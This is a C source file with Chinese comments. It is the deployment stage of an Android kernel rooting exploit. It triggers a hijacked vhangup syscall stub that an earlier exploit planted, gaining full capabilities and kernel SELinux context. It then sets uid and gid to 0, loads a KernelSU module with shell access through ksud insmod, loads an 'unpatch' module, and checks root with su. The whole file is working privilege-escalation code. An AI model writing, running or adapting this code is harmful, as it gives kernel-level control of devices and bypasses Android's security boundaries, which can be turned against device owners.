// deploy_once.c - 触发 vhangup stub (STUB_MODE=13) 并加载 KernelSU + unpatch
// 流程: syscall(58) 触发内核 stub -> 本进程 fsuid=0 + 全 caps + sid=kernel
//        -> setuid(0)/setgid(0) (有 CAP_SETUID) -> ksud insmod kernelsu-vivo.ko allow_shell=1
//        -> ksud insmod unpatch.ko -> 完成
// 运行环境: shell 域 (shizuku/adb shell), 因为 app 域 seccomp 拦 vhangup(SIGSYS)
// 前置: exploit13 已在 app 域跑完, 内核 stub13 + cap_bprm patch + kptr_restrict=0 就位
// 编译: NDK aarch64-linux-android21-clang -O2 -o deploy_once deploy_once.c
#include <unistd.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <sys/stat.h>

#define PATH_U0   "/data/local/tmp/u0"
#define PATH_KSUD "/data/local/tmp/ksud"
#define PATH_KO   "/data/local/tmp/kernelsu-vivo.ko"
#define PATH_UNP  "/data/local/tmp/unpatch.ko"
#define PATH_SU   "/data/local/tmp/su_ksu"

static void show_status(const char* tag) {
    FILE* f = fopen("/proc/self/status", "r");
    char line[256];
    printf("--- %s ---\n", tag);
    if (!f) { printf("status open fail\n"); return; }
    while (fgets(line, sizeof(line), f)) {
        if (!strncmp(line, "Uid:", 4) || !strncmp(line, "CapEff:", 7) ||
            !strncmp(line, "CapBnd:", 7)) printf("%s", line);
    }
    fclose(f);
    FILE* g = fopen("/proc/self/attr/current", "r");
    if (g) { char ctx[256]; int n = fread(ctx, 1, sizeof(ctx) - 1, g); ctx[n] = 0; printf("ctx=%s\n", ctx); fclose(g); }
}

// 以 root 执行命令并打印输出
static int run(const char* cmd) {
    printf(">>> %s\n", cmd);
    fflush(stdout);
    int rc = system(cmd);
    printf("rc=%d\n", rc);
    fflush(stdout);
    return rc;
}

int main(int argc, char** argv) {
    show_status("before");

    // 1. 触发 vhangup stub13
    long r = syscall(58);
    printf("vhangup=%ld errno=%d (%s)\n", r, errno, strerror(errno));
    if (r != 0) { printf("TRIGGER FAILED\n"); return 1; }
    show_status("after trigger");

    // 2. 提升真实 uid (stub 给了 CAP_SETUID)
    if (setgid(0) != 0) { printf("setgid fail: %s\n", strerror(errno)); return 1; }
    if (setuid(0) != 0) { printf("setuid fail: %s\n", strerror(errno)); return 1; }
    printf("setuid(0) ok, real uid=%d\n", getuid());
    show_status("after setuid");

    // 3. 加载 KernelSU (ksud 解析未导出符号; 需要真实 uid 0 读 kallsyms)
    run("export PATH=/data/local/tmp:/system/bin:$PATH; " PATH_U0 " " PATH_KSUD " insmod " PATH_KO " allow_shell=1");
    run("cat /proc/modules 2>/dev/null | grep kernelsu || /system/bin/toybox grep kernelsu /proc/modules 2>/dev/null || echo KSU_MODULE_CHECK");

    // 4. 加载 unpatch (软重启保护)
    run("export PATH=/data/local/tmp:/system/bin:$PATH; " PATH_U0 " " PATH_KSUD " insmod " PATH_UNP);
    run("cat /proc/modules 2>/dev/null | grep unpatch || /system/bin/toybox grep unpatch /proc/modules 2>/dev/null || echo UNPATCH_MODULE_CHECK");

    // 5. 验证 KSU root
    run(PATH_SU " -c id");

    printf("=== DEPLOY DONE ===\n");
    return 0;
}
